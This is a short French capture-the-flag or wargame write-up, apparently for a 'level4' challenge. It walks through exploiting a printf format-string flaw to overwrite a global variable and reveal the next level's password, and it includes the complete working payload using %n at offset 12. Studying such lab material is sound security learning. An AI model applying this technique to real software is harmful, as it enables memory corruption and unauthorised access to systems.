En analysant le code, on constate qu'afin de pouvoir lire notre prochain mot de passe, il faut pouvoir set m a . Pour cela, on constate le meme type de faille que dans le level precedent, le printf.

On va d'abbord chercher plus de details sur m:

```shell
objdump -t ./level4 | grep m
```

--> On obtient la ligne `08049810 g     O .bss	00000004              m`
m est donc bien une variable globale (.bss), l'objectif va etre de changer sa valeur. On a aussi son adresse: 08049810 (\x10\x98\x04\x08)


--> On va dorenavant calculer l'offset (comme precedemment)

```shell
./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x
```

--> On constate que la douzieme valeur est "41414141", l'offset est donc de 12.

## Nous avons donc

1. L'adresse de m : \x10\x98\x04\x08
2. Le padding : 16930116 - 4 = 16930112 (4 = adresse de m)
3. Ou ecrire: a l'offset 12 (%12$n)

Donc nous pouvons faire la commande suivante:

```shell
(python -c 'print("\x10\x98\x04\x08%16930112x%12$n")') | ./level4
```

--> Nous avons notre mot de passe pour le level 5 !
